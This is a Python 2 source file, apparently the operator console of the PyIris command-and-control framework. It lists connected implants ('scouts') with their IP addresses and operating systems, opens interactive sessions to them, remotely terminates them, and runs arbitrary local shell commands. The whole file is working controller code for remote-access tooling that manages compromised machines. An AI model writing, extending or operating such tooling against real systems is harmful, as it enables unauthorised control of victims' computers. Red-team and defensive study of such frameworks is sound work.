import time,cfg,subprocess
from modules.show_banner import *
from modules.clear_screen import *
from modules.cleanup_code import *
from modules.generic_handler import *

cfg.global_variables()


def scout_console():
    while True:
        try:
            input = raw_input(cfg.prompt_scouts).strip().split(' ',1)
            command = input[0]
            if command == 'banner':
                display_banner()
            elif command == 'help':
                print cfg.help_scouts
            elif command == 'quit':
                cleanup()
            elif command == 'clear':
                clear()
            elif command == 'back':
                print '\n' + cfg.pos + 'Returning...'
                return
            elif command == 'bridge':
                found_target = False
                try:
                    tar_id = input[1]
                except IndexError:
                    print cfg.err + 'Argument needs to be a scout ID, eg. "bridge 1"'
                    continue
                for i in range(len(cfg.db_scouts)):
                    if str(cfg.db_scouts[i][0]) == tar_id:
                        found_target = True
                        tar_id = i
                        break
                if found_target:
                    Pyiris_handler(tar_id)
                else:
                    print cfg.err + 'ID does not exist'
            elif command == 'kill':
                killed_scout = False
                try:
                    tar_id = input[1]
                except IndexError:
                    print cfg.err + 'Argument needs to be a scout ID, eg. "kill 1"'
                    continue
                for i in cfg.db_scouts:
                    if str(i[0]) == tar_id:
                        i[5].sendall('terminate' + End)
                        print cfg.pos + 'Terminated scout : ' + str(i[0])
                        killed_scout = True
                        cfg.db_scouts.pop(cfg.db_scouts.index(i))
                        break
                if not killed_scout:
                    print cfg.err + 'Could not kill scout of ID : ' + str(tar_id)
            elif command == 'kill_all':
                if cfg.db_scouts:
                    for i in cfg.db_scouts:
                        i[5].sendall('terminate' + End)
                    cfg.db_scouts = []
                    print cfg.pos + 'Terminated all'
                else:
                    print cfg.err + 'No connected scouts'
            elif command == 'show':
                print '\n' + cfg.note + 'Currently active scouts :\n'
                if cfg.db_scouts:
                    scout_data = [['ID','IP address','Identifying Name','Type','Operating System'],['==','==========','================','====','================']]
                    for i in cfg.db_scouts:
                        scout_data.append([str(i[0]),str(i[1]),str(i[2]),str(i[3]),str(i[4])])
                    l = [len(max(i, key=len)) for i in zip(*scout_data)]
                    print('\n'.join('  '.join(item[i].ljust(l[i]) for i in range(len(l)))
                                    for item in scout_data))
                    #col_width = max(len(word) for row in scout_data for word in row) + 2
                    #for row in scout_data:
                    #    print "".join(word.ljust(col_width) for word in row)
                    #print '\n'
            elif command == 'local':
                try:
                    execute = input[1]
                    print '\n' + cfg.note + 'Executing on system...\n'
                except IndexError:
                    print cfg.err + 'Specify a local system command to run'
                    continue
                if execute[:3] == 'cd ':
                    try:
                        execute = execute.replace('cd ', '')
                        os.chdir(execute)
                        print cfg.pos + "Changed to directory : " + execute
                    except (WindowsError,OSError):
                        print cfg.err + 'Could not change to directory : ' + execute
                else:
                    try:
                        result = subprocess.Popen(execute, shell=True, stdout=subprocess.PIPE,
                                                  stderr=subprocess.PIPE,
                                                  stdin=subprocess.PIPE)
                        result = result.stdout.read() + result.stderr.read()
                        print result
                    except:
                        print cfg.err + 'Could not execute command'
            elif command == '':
                pass
            else:
                print cfg.err + 'Unknown command "' + command + '", run "help" for help menu'
        except EOFError:
            try:
                time.sleep(3)
            except KeyboardInterrupt:
                cleanup()
        except KeyboardInterrupt:
            cleanup()
        except Exception as e:
            print cfg.err + 'Error : ' + str(e)
